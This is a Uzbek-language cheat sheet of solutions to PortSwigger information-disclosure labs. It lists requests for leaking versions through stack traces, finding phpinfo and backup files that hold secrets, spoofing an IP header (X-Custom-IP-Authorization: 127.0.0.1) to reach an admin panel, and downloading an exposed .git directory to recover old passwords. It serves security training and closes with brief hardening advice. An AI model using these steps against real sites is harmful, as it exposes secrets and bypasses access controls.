# Information Disclosure — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**. Maqsad: oshkor bo'lgan ma'lumotdan (versiya, secret, parol, manba
> kod) foydalanish. Tools: Burp "Find comments", content discovery, nuclei exposures.

### Info leak in error messages — APPRENTICE
Noto'g'ri tip → stack trace → framework versiyasi.
```
GET /product?productId="example"
```
> Javobda Apache Struts 2 2.3.31 → yechim: `2 2.3.31`.

### Info leak on debug page — APPRENTICE
HTML comment'da Debug link → phpinfo.
```
Burp: Engagement tools → Find comments → /cgi-bin/phpinfo.php → SECRET_KEY
```

### Source code disclosure via backup files — APPRENTICE
`/robots.txt` → `/backup` → `.bak` fayl.
```
/backup/ProductTemplate.java.bak    → ichida hardcoded Postgres parol
```

### Authentication bypass via info disclosure — PRACTITIONER
`TRACE /admin` → Burp qo'shgan `X-Custom-IP-Authorization` header ko'rinadi → uni spoof qilasan.
```
Proxy → Match and replace → har so'rovga:
X-Custom-IP-Authorization: 127.0.0.1
→ /admin → carlos delete
```

### Info leak in version control history — PRACTITIONER
`/.git` ochiq → repo'ni yuklab, o'chirilgan parolni diff'dan topasan.
```bash
wget -r https://example.com/.git/
git log       # "Remove admin password from config" commit → diff'da eski parol
```

---

### Eslatma
Doim qidir: `/robots.txt`, `/.git`, `.bak/.old/.swp`, HTML comment, stack trace, phpinfo,
`/actuator`, `/debug`. Himoya: prod'da debug off, verbose error off, VCS'ni expose qilmaslik.
Umumiy: bu papka README.
